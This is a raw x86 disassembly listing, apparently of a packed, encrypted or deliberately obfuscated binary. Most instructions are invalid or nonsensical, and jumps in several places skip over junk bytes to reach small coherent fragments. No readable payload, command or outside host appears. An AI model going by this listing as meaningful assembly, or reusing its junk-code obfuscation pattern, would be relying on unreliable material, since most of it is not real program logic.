  41069c:	or     cl,ah
  41069e:	(bad)  
  41069f:	sub    eax,0x70a4d433
  4106a4:	ins    BYTE PTR es:[edi],dx
  4106a5:	sbb    dl,BYTE PTR [ecx+edi*4+0x7b]
  4106a9:	and    bl,ch
  4106ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106ac:	aam    0xff
  4106ae:	mov    ebp,0x3dc48cb7
  4106b3:	push   ebp
  4106b4:	and    bh,BYTE PTR [eax]
  4106b6:	push   ebx
  4106b7:	and    esi,DWORD PTR [esi-0x64ae367b]
  4106bd:	iret   
  4106be:	mov    ebx,0x77544713
  4106c3:	mov    al,0x13
  4106c5:	je     0x41069e
  4106c7:	cmp    DWORD PTR [edi],0x43749a88
  4106cd:	push   ebp
  4106ce:	add    BYTE PTR [edx+0x4c],dl
  4106d1:	stos   BYTE PTR es:[edi],al
  4106d2:	add    eax,0x9a75754c
  4106d7:	outs   dx,BYTE PTR ds:[esi]
  4106d8:	(bad)
  4106db:	out    0xc4,al
  4106dd:	sar    BYTE PTR [edi+0x30],0x22
  4106e1:	adc    BYTE PTR [ebx+0x72],0x2e
  4106e5:	jg     0x4106c6
  4106e7:	ret    0x19ad
  4106ea:	gs icebp 
  4106ec:	or     eax,0xffffff8d
  4106ef:	dec    eax
  4106f0:	cmp    ecx,eax
  4106f2:	mov    edx,0x8ade7f16
  4106f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106f8:	aam    0x67
  4106fa:	or     ebx,eax
  4106fc:	add    ch,BYTE PTR [edi-0x60987310]
  410702:	mov    cl,0x5d
  410704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410705:	mov    ds:0x294a1839,al
  41070a:	ret    
  41070b:	push   ebx
  41070c:	xor    ch,dl
  41070e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41070f:	xbegin 0xb74c58b0
  410715:	es je  0x4106de
  410718:	or     al,0xd3
  41071a:	in     eax,dx
  41071b:	jne    0x4106c8
  41071d:	mov    bh,0x94
  41071f:	mov    WORD PTR [ebx+esi*4-0x4d57b137],es
  410726:	(bad)  
  410727:	mov    edx,0x40d778f3
  41072c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41072d:	pop    eax
  41072e:	jmp    0x739a446c
  410733:	loop   0x41077f
  410735:	fadd   QWORD PTR ds:0x57bce8d7
  41073b:	cmp    bl,BYTE PTR [esi-0x53]
  41073e:	xchg   edi,eax
  41073f:	jl     0x41071a
  410741:	lods   al,BYTE PTR ds:[esi]
  410742:	cmp    DWORD PTR [edi+0x52],edx
  410745:	je     0x410747
  410747:	(bad)  
  410748:	pop    ecx
  410749:	div    DWORD PTR [eax]
  41074b:	aam    0xa5
  41074d:	inc    esp
  41074e:	outs   dx,BYTE PTR ds:[esi]
  41074f:	retf   
  410750:	mov    eax,0xe2b01169
  410755:	(bad)  
  410756:	dec    ebx
  410757:	cmp    ebx,DWORD PTR [ebp-0x6b]
  41075a:	xchg   DWORD PTR [eax],esp
  41075c:	jmp    0x9689:0x2d32f895
  410763:	jecxz  0x4107b3
  410765:	iret   
  410766:	mov    ss,WORD PTR [edi]
  410768:	xlat   BYTE PTR ds:[ebx]
  410769:	mov    edx,0xf21e073
  41076e:	mov    dl,0xa0
  410770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410771:	aam    0x91
  410773:	mov    ebp,0x7984e540
  410778:	and    ecx,DWORD PTR [ebx+0x75]
  41077b:	int3   
  41077c:	cs pop bp
  41077f:	test   DWORD PTR [edi+0x28d62605],edx
  410785:	imul   ebx,ecx,0xffffff8b
  410788:	jne    0x410792
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	mov    ecx,0x8bba61c5
  4107ad:	inc    esi
  4107ae:	jo     0x410820
  4107b0:	mov    ds:0x1c70707d,eax
  4107b5:	xchg   ecx,eax
  4107b6:	xchg   dl,ah
  4107b8:	punpckhwd mm0,QWORD PTR [edx+0x20]
  4107bc:	xchg   edx,eax
  4107bd:	js     0x410825
  4107bf:	sub    DWORD PTR [edx+0x789bc3aa],esi
  4107c5:	xchg   DWORD PTR [esi+ebp*2-0x2e],ebp
  4107c9:	mov    dh,0xeb
  4107cb:	push   esp
  4107cc:	adc    ecx,esi
  4107ce:	outs   dx,BYTE PTR ds:[esi]
  4107cf:	inc    ebx
  4107d0:	imul   esi,ebp,0xd634c9b7
  4107d6:	mov    eax,ds:0x93c86853
  4107db:	xor    DWORD PTR [ebx],ebp
  4107dd:	jbe    0x410810
  4107df:	imul   ecx,DWORD PTR [ebp+0x37],0x85782022
  4107e6:	dec    esi
  4107e7:	je     0x4107ba
  4107e9:	mov    ah,0x3c
  4107eb:	iret   
  4107ec:	mov    edx,edi
  4107ee:	mov    al,ds:0x1a603cf8
  4107f3:	cmp    DWORD PTR cs:[edi+0x2],0x29
  4107f8:	pop    esi
  4107f9:	mov    ebx,0xd3ae0cba
  4107fe:	fbstp  TBYTE PTR [eax+ecx*8-0x4c]
  410802:	vprotd ymm10,xmm4,[esi+0x2a098781]
  41080b:	loopne 0x41087d
  41080d:	pusha  
  41080e:	lds    eax,FWORD PTR [ebx+0x63]
  410811:	(bad)  
  410812:	in     eax,dx
  410813:	out    0x41,eax
  410815:	add    DWORD PTR [edx+0x28715539],edx
  41081b:	inc    ebp
  41081c:	mov    ecx,DWORD PTR [ebx*4+0x7f74d35e]
  410823:	add    al,0x5b
  410825:	pop    esi
  410826:	gs int 0x20
  410829:	cdq    
  41082a:	cwde   
  41082b:	sub    al,0xd9
  41082d:	pop    ds
  41082e:	cmp    BYTE PTR [edi+0x16],ah
  410831:	ret    
  410832:	mov    al,ds:0x165923c8
  410837:	or     esp,eax
  410839:	jmp    0x6cc0:0x4caba57
  410840:	mov    edx,0x27a8cf56
  410845:	add    al,0x7c
  410847:	rol    BYTE PTR [edi+0x5abf255d],1
  41084d:	out    dx,al
  41084e:	push   ebx
  41084f:	(bad)  
  410851:	shl    DWORD PTR [eax],1
  410853:	inc    edx
  410854:	jbe    0x4107e7
  410856:	xor    BYTE PTR [esi+edx*8],ch
  410859:	iret   
  41085a:	(bad)  
  41085b:	and    eax,0x9703fba9
  410860:	jg     0x410836
  410862:	pop    ecx
  410863:	cmp    eax,0xe2d224ed
  410868:	push   edi
  410869:	out    dx,al
  41086a:	add    bl,bh
  41086c:	cmp    BYTE PTR [ecx],dl
  41086e:	jge    0x4108ed
  410870:	pop    ebx
  410871:	jl     0x410870
  410873:	add    DWORD PTR [ecx],edi
  410875:	push   edi
  410876:	mov    ?,WORD PTR [edi+0x33]
  410879:	rcr    BYTE PTR [edx],0x45
  41087c:	lahf   
  41087d:	sbb    eax,0x2f0d7a90
  410882:	mov    BYTE PTR [eax-0x28c3f077],bh
  410888:	imul   edi,ebx,0x4400a770
  41088e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41088f:	jmp    0x410875
  410891:	or     ebx,DWORD PTR [eax]
  410893:	push   edx
  410894:	sub    ebp,DWORD PTR [eax-0x4e5ea007]
  41089a:	mov    ah,0x14
  41089c:	jp     0x4108da
  41089e:	lods   eax,DWORD PTR ds:[esi]
  41089f:	retf   0x55bc
  4108a2:	add    bl,BYTE PTR [edx+ebx*4+0x2b]
  4108a6:	jb     0x4108fa
  4108a8:	scas   eax,DWORD PTR es:[edi]
  4108a9:	es jg  0x4108c4
  4108ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ad:	xor    esp,DWORD PTR [eax-0x1a]
  4108b0:	jge    0x4108ee
  4108b2:	pushf  
  4108b3:	mov    ch,0x14
  4108b5:	xlat   BYTE PTR ds:[ebx]
  4108b6:	sbb    BYTE PTR [eax+ebx*8-0x328813b7],al
  4108bd:	ror    BYTE PTR [ecx+ebx*8-0x7c],cl
  4108c1:	mov    esi,0x972a98a7
  4108c6:	add    ecx,DWORD PTR [ebx]
  4108c8:	pop    esi
  4108c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108ca:	pop    ds
  4108cb:	cli    
  4108cc:	add    al,0xd4
  4108ce:	dec    esp
  4108cf:	sar    DWORD PTR [ebp-0x40],1
  4108d2:	repnz add eax,0x573be0ab
  4108d8:	ins    DWORD PTR es:[edi],dx
  4108d9:	cmp    BYTE PTR [ecx],ch
  4108db:	aaa    
  4108dc:	hlt    
  4108dd:	sub    eax,0x3130b848
  4108e2:	push   ecx
  4108e3:	xchg   ebp,eax
  4108e4:	adc    BYTE PTR [esi],0xaa
  4108e7:	jae    0x410944
  4108e9:	xchg   ebx,eax
  4108ea:	out    0x1d,al
  4108ec:	call   esi
  4108ee:	or     esi,0xffffffbf
  4108f1:	test   eax,0x310fe210
  4108f6:	add    bh,BYTE PTR [esi]
  4108f8:	das    
  4108f9:	ss inc esi
  4108fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108fc:	jnp    0x410927
  4108fe:	imul   DWORD PTR [eax+ebp*4-0x73]
  410902:	or     esi,DWORD PTR [eax]
  410904:	jae    0x41093a
  410906:	or     eax,0xc1227b48
  41090b:	or     ah,bl
  41090d:	cld    
  41090e:	adc    BYTE PTR [ebx],ch
  410910:	bound  edx,QWORD PTR [ebx-0x72d09b7e]
  410916:	mov    edi,0xf591541
  41091b:	dec    esi
  41091c:	pop    bp
  41091e:	mov    al,al
  410920:	ja     0x4108d4
  410922:	out    0x99,eax
  410924:	rcl    DWORD PTR [edx+0x55],cl
  410927:	xor    esp,edx
  410929:	add    DWORD PTR [eax],esp
  41092b:	xlat   BYTE PTR ds:[ebx]
  41092c:	pop    esp
  41092d:	mov    dh,0xb1
  41092f:	stos   DWORD PTR es:[edi],eax
  410930:	xchg   ebx,eax
  410931:	inc    esi
  410932:	xchg   edx,eax
  410933:	pusha  
  410934:	mov    dh,0x9c
  410936:	mov    ecx,0xdadc8b9
  41093b:	cwde   
  41093c:	mov    edx,0xb8b59261
  410941:	loope  0x410963
  410943:	aad    0x3c
  410945:	repnz aam 0x3
  410948:	xor    eax,DWORD PTR cs:[edi+ebp*8+0x1]
  41094d:	lods   eax,DWORD PTR ds:[esi]
  41094e:	ret    
  41094f:	rol    BYTE PTR [esi],1
  410951:	scas   eax,DWORD PTR es:[edi]
  410952:	das    
  410953:	int3   
  410954:	cs test eax,0xfd01a000
  41095a:	adc    DWORD PTR [ecx+0x3f],0xffffff9e
  41095e:	ins    BYTE PTR es:[edi],dx
  41095f:	sbb    esi,DWORD PTR [esi]
  410961:	pop    edx
  410962:	inc    ebx
  410963:	push   0xd4f55e5
  410968:	or     ebx,ebx
  41096a:	adc    ebp,edi
  41096c:	pop    edi
  41096d:	pop    ecx
  41096e:	mov    ebp,0x41da039f
  410973:	fs cs push 0xffffffb4
  410977:	scas   eax,DWORD PTR es:[di]
  410979:	xlat   BYTE PTR ds:[ebx]
  41097a:	dec    eax
  41097b:	sbb    al,0x5c
  41097d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41097e:	inc    edi
  41097f:	add    ch,BYTE PTR [esi]
  410981:	mov    edx,0xbb1e38c1
  410986:	mov    ebp,0x474124ab
  41098b:	jns    0x410921
  41098d:	mov    cl,0x8b
  41098f:	lea    edi,[esi]
  410991:	xchg   esi,eax
  410992:	imul   edi,ebp,0x84218d38
  410998:	lods   eax,DWORD PTR ds:[esi]
  410999:	jno    0x410a1a
  41099b:	sub    al,0xc5
  41099e:	add    al,0x50
  4109a0:	or     BYTE PTR [edx],ah
  4109a2:	or     DWORD PTR ds:0xbfc1006f,ecx
  4109a8:	pop    ebp
  4109a9:	lods   eax,DWORD PTR ds:[esi]
  4109aa:	or     eax,DWORD PTR [eax]
  4109ac:	out    dx,eax
  4109ad:	or     eax,0x4b4d4552
  4109b2:	(bad)  
  4109b3:	push   ebp
  4109b4:	pushf  
  4109b5:	inc    edx
  4109b6:	jne    0x410998
  4109b8:	or     esi,DWORD PTR [edx]
  4109ba:	mov    ecx,0xa67514c7
  4109bf:	xchg   BYTE PTR [edi+0x2d],bl
  4109c2:	mov    cl,0xc0
  4109c4:	out    0xf3,eax
  4109c6:	adc    eax,0x54dda923
  4109cb:	pop    esi
  4109cc:	jne    0x410a01
  4109ce:	mov    ds:0xc366edbc,al
  4109d3:	dec    ebx
  4109d4:	je     0x4109b2
  4109d6:	clc    
  4109d7:	fcomp  DWORD PTR [esi]
  4109d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109da:	xor    esi,DWORD PTR [ebx+0x32]
  4109dd:	or     DWORD PTR [esi-0x71afef48],eax
  4109e3:	mov    esi,0x15d75d65
  4109e8:	mov    edi,0x76b97852
  4109ed:	loopne 0x4109ca
  4109ef:	stos   BYTE PTR es:[edi],al
  4109f0:	addr16 sub edi,ecx
  4109f3:	mov    esp,gs
  4109f5:	xor    DWORD PTR fs:[ebx],ecx
  4109f8:	call   0x62d4c587
  4109fd:	and    bh,BYTE PTR [ebx+0x26]
  410a00:	jb     0x410a4d
  410a02:	retf   
  410a03:	(bad)  [ecx]
  410a05:	test   eax,0x32595802
  410a0a:	adc    BYTE PTR [esi-0xfffc820],ch
  410a10:	or     cl,cl
  410a12:	jmp    0x410998
  410a14:	(bad)  [eax-0x419a13ad]
  410a1a:	jge    0x410a0c
  410a1c:	xchg   ebp,eax
  410a1d:	mov    ?,esi
  410a1f:	pop    eax
  410a20:	sbb    DWORD PTR [ecx+eax*4-0x70c398de],edx
  410a27:	adc    eax,0x6a9a4a1b
  410a2c:	je     0x4109dd
  410a2e:	jbe    0x410a0f
  410a30:	mov    ah,0x16
  410a32:	xchg   DWORD PTR [esi-0x7],esi
  410a35:	mov    ebp,0x19665099
  410a3a:	aaa    
  410a3b:	pop    ds
  410a3c:	data16 fbld TBYTE PTR [eax+eax*1+0x36]
  410a41:	add    esp,DWORD PTR [ecx]
  410a43:	sub    ah,BYTE PTR [edx-0x79]
  410a46:	popa   
  410a47:	icebp  
  410a48:	pop    ebx
  410a49:	test   BYTE PTR [eax+ecx*2-0x9],0xdf
  410a4e:	(bad)  
  410a50:	inc    esi
  410a51:	fisub  WORD PTR [esi-0x1cc394ea]
  410a57:	jl     0x410a84
  410a59:	retf   0xd578
  410a5c:	push   edx
  410a5d:	in     eax,dx
  410a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a5f:	push   0xffffffd6
  410a61:	(bad)
  410a64:	aas    
  410a65:	cs int 0x56
  410a68:	gs jno 0x410adc
  410a6b:	outs   dx,DWORD PTR ds:[esi]
  410a6c:	cmc    
  410a6d:	mov    ds:0x7b09982d,al
  410a72:	(bad)  [ebx+0x5916c612]
  410a78:	lahf   
  410a79:	test   al,0x29
  410a7b:	pop    eax
  410a7c:	inc    esp
  410a7d:	js     0x410a2d
  410a7f:	or     DWORD PTR [ebx+0x13],eax
  410a82:	popf   
  410a83:	outs   dx,BYTE PTR ds:[esi]
  410a84:	pop    esp
  410a85:	mov    BYTE PTR [eax+0x31],al
  410a88:	dec    ecx
  410a89:	fldlg2 
  410a8b:	ds ds popa 
  410a8e:	pop    esi
  410a8f:	das    
  410a90:	call   0x6b9:0x994a902
  410a97:	add    edi,DWORD PTR [ebx-0x7b359c42]
  410a9d:	or     dh,BYTE PTR [edx]
  410a9f:	mov    dh,0xf7
  410aa1:	aad    0x47
  410aa3:	dec    edx
  410aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410aa5:	ins    DWORD PTR es:[edi],dx
  410aa6:	out    0x0,eax
  410aa8:	cdq    
  410aa9:	(bad)  
  410aab:	mov    ch,0xd8
  410aad:	mov    DWORD PTR [edi],esi
  410aaf:	or     edi,0xffffffad
  410ab2:	push   cs
  410ab3:	popa   
  410ab4:	pop    ebx
  410ab5:	pop    ebx
  410ab6:	lods   eax,DWORD PTR ds:[esi]
  410ab7:	mov    cl,BYTE PTR [edi+0x614af870]
  410abd:	xor    BYTE PTR [ebx],ah
  410abf:	push   ebx
  410ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ac1:	daa    
  410ac2:	push   esp
  410ac3:	xor    cl,BYTE PTR [ecx]
  410ac5:	(bad)  
  410ac6:	inc    ecx
  410ac7:	test   BYTE PTR [esi-0x15],al
  410aca:	pop    esp
  410acb:	in     al,dx
  410acc:	sbb    BYTE PTR [edi+0x408764aa],0x7b
  410ad3:	in     eax,0x16
  410ad5:	mov    ebp,0x91b7821a
  410ada:	out    dx,eax
  410adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410adc:	xlat   BYTE PTR ds:[ebx]
  410add:	jo     0x410a99
  410adf:	sahf   
  410ae0:	out    0xaf,eax
  410ae2:	xor    BYTE PTR [edi+ebx*8+0x50],bh
  410ae6:	punpckhbw mm3,QWORD PTR [eax-0x1ba752e9]
  410aed:	call   DWORD PTR [edx]
  410aef:	div    BYTE PTR [eax-0x2c367fc9]
  410af5:	add    al,0xd7
  410af7:	sub    eax,0x670731f6
  410afc:	fucomi st,st(1)
  410afe:	outs   dx,BYTE PTR ds:[esi]
  410aff:	inc    esi
  410b00:	mov    ch,0xbd
  410b02:	or     BYTE PTR [ebx],al
  410b04:	dec    ecx
  410b05:	fsubr  st(0),st
  410b07:	mov    al,0xc0
  410b09:	arpl   WORD PTR [esi-0x3],bp
  410b0c:	or     DWORD PTR [eax-0x10da5d2],eax
  410b12:	rcr    DWORD PTR [ebx+0x17],cl
  410b15:	iret   
  410b16:	test   DWORD PTR [esi+0x6daf3232],edi
  410b1c:	call   0x8abd:0xda375bec
  410b23:	shr    DWORD PTR [ebp-0x1f625ef],cl
  410b29:	push   edx
  410b2a:	daa    
  410b2b:	pop    esi
  410b2c:	aas    
  410b2d:	and    eax,0x49f37229
  410b32:	add    ecx,esp
  410b34:	lahf   
  410b35:	mov    eax,0xf3adbda8
  410b3a:	dec    ecx
  410b3b:	jbe    0x410ba5
  410b3d:	sti    
  410b3e:	mov    cl,dh
  410b40:	jmp    0x7777:0x96647f83
  410b47:	nop
  410b48:	sbb    cl,bl
  410b4a:	mov    al,0x21
  410b4c:	add    eax,DWORD PTR [esi]
  410b4e:	adc    dl,ah
  410b50:	dec    ecx
  410b51:	mov    bl,bh
  410b53:	or     edi,DWORD PTR ss:[ecx+ebp*8]
  410b57:	cwde   
  410b58:	push   es
  410b59:	repnz adc cl,BYTE PTR [eax-0x3c]
  410b5d:	das    
  410b5e:	sar    DWORD PTR [eax],1
  410b60:	xor    BYTE PTR [ecx],bh
  410b62:	inc    esi
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz add ebp,DWORD PTR [edx+0x423e927e]
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c2e
  410bb1:	cmc    
  410bb2:	sbb    ah,dl
  410bb4:	adc    eax,0x3dcc678e
  410bb9:	call   0x41a4ad90
  410bbe:	stc    
  410bbf:	ins    DWORD PTR es:[edi],dx
  410bc0:	and    al,0xa6
  410bc2:	sub    esi,DWORD PTR [esi]
  410bc4:	adc    cl,dl
  410bc6:	lea    esi,[edi+0x685d9f74]
  410bcc:	imul   BYTE PTR [edx]
  410bce:	xchg   DWORD PTR ds:0xcd6d25dc,esi
  410bd4:	cmp    al,0x1a
  410bd6:	or     esp,ecx
  410bd8:	jg     0x410baf
  410bda:	dec    eax
  410bdb:	mov    eax,0x91afb48a
  410be0:	scas   eax,DWORD PTR es:[edi]
  410be1:	and    BYTE PTR [edx],dh
  410be3:	scas   eax,DWORD PTR es:[edi]
  410be4:	pusha  
  410be5:	mov    ah,0x48
  410be7:	icebp  
  410be8:	loop   0x410b6f
  410bea:	ret    0xe969
  410bed:	pop    ebp
  410bee:	loopne 0x410bd1
  410bf0:	jns    0x410c0b
  410bf2:	stos   BYTE PTR es:[edi],al
  410bf3:	ret    0x135
  410bf6:	pop    ecx
  410bf7:	xchg   edi,eax
  410bf8:	into   
  410bf9:	push   edx
  410bfa:	jg     0x410b97
  410bfc:	or     DWORD PTR [edx],0x5a
  410bff:	cdq    
  410c00:	and    al,0xd1
  410c02:	adc    eax,0xf911cee9
  410c07:	inc    ebx
  410c08:	inc    ecx
  410c09:	dec    ecx
  410c0a:	cmp    al,dh
  410c0c:	outs   dx,DWORD PTR ds:[esi]
  410c0d:	fnstsw WORD PTR [ebp-0x7bf873ea]
  410c13:	aas    
  410c14:	add    BYTE PTR [eax+0x77],al
  410c17:	sbb    ecx,DWORD PTR [edi+edi*2]
  410c1a:	push   esi
  410c1b:	loope  0x410bda
  410c1d:	fwait
  410c1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c1f:	mov    esp,0xb5117a75
  410c24:	ret    
  410c25:	mov    esi,0xa5f1c964
  410c2a:	inc    ebp
  410c2b:	(bad)  
  410c2d:	cli    
  410c2e:	ins    DWORD PTR es:[edi],dx
  410c2f:	sub    DWORD PTR [ecx-0x348d49a2],0x77
  410c36:	loope  0x410ca3
  410c38:	nop
  410c39:	sbb    bl,BYTE PTR [eax+0x57]
  410c3c:	or     BYTE PTR [ecx-0x2f],ch
  410c3f:	int    0x7c
  410c41:	or     al,BYTE PTR [edi+0x6a]
  410c44:	push   ebx
  410c45:	popa   
  410c46:	enter  0x3d8d,0xef
  410c4a:	adc    ch,0x25
  410c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c4e:	mov    esp,0x72fa6cce
  410c53:	dec    edx
  410c54:	mov    ah,BYTE PTR [ecx+0x5893b90d]
  410c5a:	outs   dx,DWORD PTR ds:[esi]
  410c5b:	xor    ebp,DWORD PTR [esi]
  410c5d:	sti    
  410c5e:	xchg   BYTE PTR [ebx],cl
  410c60:	cmc    
  410c61:	cwde   
  410c62:	and    eax,0xd16ab7b9
  410c67:	pop    edi
  410c68:	in     al,dx
  410c69:	push   es
  410c6a:	stos   DWORD PTR es:[edi],eax
  410c6b:	xor    esp,DWORD PTR [ebx+0x35768095]
  410c71:	sub    eax,0x1105bf90
  410c76:	mov    BYTE PTR [ebx-0x30],ch
  410c79:	shl    BYTE PTR [esp+ecx*4],0xb8
  410c7d:	cmp    BYTE PTR [edi+0x4ab1a2b8],bl
  410c83:	sbb    DWORD PTR [ebp+0x7d04496f],ebx
  410c89:	in     eax,0x46
  410c8b:	mov    eax,0xf2b8e643
  410c90:	xlat   BYTE PTR ds:[ebx]
  410c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c92:	pop    ecx
  410c93:	inc    edx
  410c94:	call   0x69d9bae6
  410c99:	push   ss
  410c9a:	jne    0x410cd4
  410c9c:	loop   0x410d03
  410c9e:	sub    al,0x12
  410ca0:	push   ecx
  410ca1:	pop    ebx
  410ca2:	jb     0x410d0e
  410ca4:	xchg   ecx,eax
  410ca5:	pop    ebp
  410ca6:	fadd   QWORD PTR [edx+ebx*4]
  410ca9:	mov    dl,0xbe
  410cab:	xchg   ecx,eax
  410cac:	inc    ebx
  410cad:	pop    edx
  410cae:	pop    ecx
  410caf:	mov    ah,BYTE PTR [eax]
  410cb1:	mov    ds:0x3d7f5408,eax
  410cb6:	add    ebp,DWORD PTR [esi-0x12]
  410cb9:	pop    es
  410cba:	repz mov ebx,0xfcb38ed2
  410cc0:	inc    edx
  410cc1:	arpl   WORD PTR [ebp+0x23],bx
  410cc4:	clc    
  410cc5:	test   al,0x4e
  410cc7:	inc    edx
  410cc8:	inc    edx
  410cc9:	mov    edx,0x28571862
  410cce:	imul   ebx,DWORD PTR [ecx-0x6a],0x3a0ca583
  410cd5:	mov    ebp,0xcaf809e2
  410cda:	inc    eax
  410cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cdc:	mov    esp,0x23992b51
  410ce1:	pop    ds
  410ce2:	cmp    edi,DWORD PTR [ebx-0x4e]
  410ce5:	cmp    esp,DWORD PTR [ebx+0x6b]
  410ce8:	mov    ds,WORD PTR [ecx]
  410cea:	mov    dh,0xc9
  410cec:	jnp    0x410cdd
  410cee:	(bad)  
  410cef:	bound  esp,QWORD PTR ds:0x7cd842ad
  410cf5:	lahf   
  410cf6:	aaa    
  410cf7:	pushf  
  410cf8:	mov    ecx,0x5d423a73
  410cfd:	lods   eax,DWORD PTR ds:[esi]
  410cfe:	push   cs
  410cff:	add    DWORD PTR [ecx],ebp
  410d01:	scas   eax,DWORD PTR es:[edi]
  410d02:	fistp  QWORD PTR [esi]
  410d04:	push   ebx
  410d05:	and    DWORD PTR [ebx+0x1a],ebx
  410d08:	cmp    eax,0x4ef987e9
  410d0d:	lea    ecx,[edi]
  410d0f:	push   0xa632058
  410d14:	push   0x448e94b2
  410d19:	mov    bh,0x45
  410d1b:	cmp    eax,0xef9c5748
  410d20:	push   ebp
  410d21:	imul   esi,DWORD PTR [esi+0x50],0x4d
  410d25:	aad    0xb1
  410d27:	mov    bh,0xbb
  410d29:	mov    cl,0xc0
  410d2b:	mov    ecx,0x2026cbac
  410d30:	jnp    0x410cba
  410d32:	pop    ebx
  410d33:	cld    
  410d34:	push   0x7cfa360e
  410d39:	test   eax,0x3131721b
  410d3e:	inc    ebp
  410d3f:	jns    0x410d7a
  410d41:	push   eax
  410d42:	(bad)  
  410d43:	cli    
  410d44:	ins    BYTE PTR es:[edi],dx
  410d45:	not    DWORD PTR [eax+0x2f548f1]
  410d4b:	test   BYTE PTR [edx+0x5925aad1],ah
  410d51:	dec    edx
  410d52:	add    edi,esp
  410d54:	fistp  DWORD PTR [eax-0x7f745be5]
  410d5a:	imul   ebx,DWORD PTR [di],0xfffffff4
  410d5e:	sar    BYTE PTR [ecx-0x1f8722ca],cl
  410d64:	mov    dh,0x7c
  410d66:	sub    al,0x8
  410d68:	push   cs
  410d69:	jno    0x410d1a
  410d6b:	inc    edx
  410d6c:	aaa    
  410d6d:	in     al,0xa5
  410d6f:	jnp    0x410dc7
  410d71:	jns    0x410d9c
  410d73:	or     eax,0x5dc53452
  410d78:	mov    ah,0x6b
  410d7a:	daa    
  410d7b:	jmp    0xb1cd:0xd3d74717
  410d82:	or     cl,dh
  410d84:	xor    al,0x1b
  410d86:	jno    0x410d3d
  410d88:	imul   ebx,DWORD PTR [esi-0x430dde86],0x9c84c688
  410d92:	stos   DWORD PTR es:[edi],eax
  410d93:	ror    BYTE PTR [ecx+eax*2],cl
  410d96:	leave  
  410d97:	sqrtps xmm6,XMMWORD PTR [eax]
  410d9a:	call   0x62ed579d
  410d9f:	push   ss
  410da0:	mov    ds:0xd160deb5,al
  410da5:	test   BYTE PTR [ecx],ch
  410da7:	push   es
  410da8:	pop    ecx
  410da9:	mov    ds:0x92d5ad7,eax
  410dae:	mov    gs,WORD PTR [ecx+0x74060881]
  410db4:	xchg   ecx,eax
  410db5:	fild   QWORD PTR [ebp-0x26f1c018]
  410dbb:	xchg   ebp,eax
  410dbc:	dec    ebp
  410dbd:	xchg   ebp,ebx
  410dbf:	dec    ebx
  410dc0:	popa   
  410dc1:	dec    esi
  410dc2:	push   ds
  410dc3:	mov    ds:0x19bc66d4,al
  410dc8:	adc    esi,DWORD PTR [edx-0x5092ccf]
  410dce:	push   esi
  410dcf:	mov    ebp,esi
  410dd1:	push   0x6c
  410dd3:	push   esp
  410dd4:	pop    es
  410dd5:	aad    0x38
  410dd7:	jmp    0x95cecd70
  410ddc:	or     ah,BYTE PTR [esi+0x48]
  410ddf:	int    0x6a
  410de1:	loop   0x410e46
  410de3:	aaa    
  410de4:	shl    DWORD PTR [esi-0x27],cl
  410de7:	xor    DWORD PTR [edx],eax
  410de9:	rol    ecx,1
  410deb:	das    
  410dec:	arpl   WORD PTR [eax+eax*8+0x22a146e3],cx
  410df3:	sbb    ch,bh
  410df5:	pop    edx
  410df6:	ins    DWORD PTR es:[edi],dx
  410df7:	and    DWORD PTR [esi-0x7f],esp
  410dfa:	sahf   
  410dfb:	fcmovu st,st(7)
  410dfd:	push   ecx
  410dfe:	mov    ?,WORD PTR [eax-0x71ebef0f]
  410e04:	cmp    DWORD PTR [edx],edi
  410e06:	adc    eax,0xc1964baa
  410e0b:	ficomp WORD PTR [edi-0x6d]
  410e0e:	push   ss
  410e0f:	mov    esi,0xeb3ef22f
  410e14:	dec    eax
  410e15:	aad    0x50
  410e17:	sar    DWORD PTR [edi+0x30],1
  410e1a:	pop    edx
  410e1b:	mov    esp,0xe5b84bd2
  410e20:	out    dx,al
  410e21:	mov    eax,ds:0x7d575544
  410e26:	mov    esp,0xe078fb63
  410e2b:	jmp    DWORD PTR [ecx+0x32]
  410e2e:	test   al,0x6
  410e30:	out    0xd1,eax
  410e32:	lahf   
  410e33:	sub    esi,DWORD PTR [edi-0x54]
